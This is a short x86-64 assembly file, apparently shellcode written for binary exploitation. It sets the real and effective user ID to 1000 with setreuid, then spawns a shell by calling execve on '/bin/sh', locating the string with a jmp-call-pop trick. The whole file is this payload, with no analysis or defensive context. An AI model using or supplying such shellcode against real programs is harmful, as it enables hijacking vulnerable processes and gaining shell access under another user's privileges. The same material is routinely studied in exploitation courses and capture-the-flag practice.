bits 64
section .text
global _start

_start:
	
	; setreuid(1000, 1000)

	xor rax, rax
	mov al, 0x71
	mov rdi, rax
	mov di, 1000
	mov rsi, rdi

	syscall 

	jmp binsh

	exec:
	
	; execve("/bin/sh", NULL, NULL)
	
	mov rsi, rax
	mov rdx, rax
	mov al, 0x3b
	pop rdi

	syscall

	binsh:
		call exec
		db "/bin/sh"